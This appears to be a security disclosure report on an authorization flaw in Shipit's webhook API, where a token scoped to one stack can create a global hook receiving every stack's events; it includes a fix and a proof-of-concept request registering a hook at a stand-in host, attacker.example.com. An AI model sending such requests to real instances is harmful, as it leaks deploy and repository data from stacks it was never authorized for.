### Title
API client scoped to a single stack can create a global webhook `Hook` that receives events for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController#create` determines whether a created `Hook` is stack-scoped purely from the *presence of `params[:stack_id]` in the URL*, not from the authenticated `ApiClient`'s own stack scope. Because the engine exposes both a stack-nested route (`/api/stacks/:stack_id/hooks`) and a top-level, unscoped route (`/api/hooks`) for the same controller/action, an `ApiClient` that is scoped to a single stack (`api_client.stack_id` set) and merely holds the `write:hook` permission can call the top-level route to create a `stack_id: nil` (global) `Hook`. Global hooks receive delivery for **every** stack's events, breaking the intended binding "stack a token authorises == stack it touches."

### Finding Description
`ApiClient` supports being scoped to a single stack via `stack_id`, and `Shipit::Api::BaseController#stacks` is supposed to enforce that scope for every stack-related lookup: [1](#0-0) 

However, `HooksController#create` does not go through this scoping mechanism when the URL doesn't carry a `stack_id`: [2](#0-1) 

`stack_id` (the private method) is defined as:
```ruby
def stack_id
  stack.id if params[:stack_id].present?
end
```
When `params[:stack_id]` is absent — which is the case on the unscoped route — this returns `nil` without ever calling `stack`/`stacks`, so `current_api_client.stack_id?` (the scoping restriction) is never consulted. The resulting `Hook.where(stack_id:).create(params)` creates a hook with `stack_id: nil`, i.e. a **global** hook.

Both routes point at the same controller and action: [3](#0-2) 

Global hooks (`stack_id: nil`) are delivered for events on every stack, not just one: [4](#0-3) 
(`scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }` and `Hook.deliver` iterates `for_stack(stack_id)`).

The equality that should hold — "the stack a token authorizes == the stack whose events the created hook can read" — is broken: the token is only authorized for one stack (`current_api_client.stack_id`), but the hook it creates can read events (`deploy`, `rollback`, `task`, `commit_status`, `merge_status`, `merge`, `pull_request`, `stack`, `review_stack`) for **all** stacks in the Shipit instance, including stacks the client's permission was never meant to cover.

### Impact Explanation
An attacker (or a legitimately-issued, narrowly-scoped `ApiClient` token holder — e.g. a team member given a token restricted to their own stack for hook management) can register a delivery URL they control and receive continuous webhook deliveries carrying event payloads for every stack managed by the Shipit instance — deploy status, task output links, commit statuses, pull request/merge data for repositories/stacks that client was never granted `read:stack` or `read:hook` access to. This is an unauthenticated (from the perspective of those other stacks) read of stack state / deploy/task metadata, matching the "unauthenticated read of stack state, task streams or deploy output" High-severity class.

### Likelihood Explanation
Likelihood is high for any deployment that issues stack-scoped `ApiClient` tokens with `write:hook` permission (a documented/intended use case, since `ApiClient` explicitly supports `stack_id` scoping combined with `write:hook`). No special privilege beyond a legitimately-scoped token is required — the attacker only needs a valid `ApiClient` credential meant to be limited to one stack, and knowledge that the unscoped `/api/hooks` route exists (documented in `config/routes.rb`).

### Recommendation
`Shipit::Api::HooksController#create` (and `#index`) should reject stack-scoped `ApiClient`s that attempt to create/list hooks without a `stack_id`, or force the created hook's `stack_id` to `current_api_client.stack_id` when the client is stack-scoped, e.g.:
```ruby
def stack_id
  return current_api_client.stack_id if current_api_client.stack_id?
  stack.id if params[:stack_id].present?
end
```
and reject requests where a stack-scoped client supplies a `stack_id` that differs from its own.

### Proof of Concept
1. Admin creates `ApiClient` `A` with `stack: shopify/repo-x/production`, `permissions: ["write:hook"]`, intending it to manage hooks only for that stack.
2. Attacker/holder of `A`'s token issues:
   ```
   POST /api/hooks
   Authorization: Basic <A's token>
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","task","commit_status","pull_request"] }
   ```
   (no `stack_id` in the URL — using the top-level route from `config/routes.rb`)
3. `HooksController#create` computes `stack_id` as `nil` (since `params[:stack_id]` is absent), creating a global `Hook`.
4. `Hook.deliver` is invoked for every stack's events (`for_stack(stack_id)` includes `stack_id: nil`), so `attacker.example.com` now receives deploy/task/commit-status/pull-request payloads for **all** stacks in the instance, not just `shopify/repo-x/production`. [4](#0-3) [5](#0-4)

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
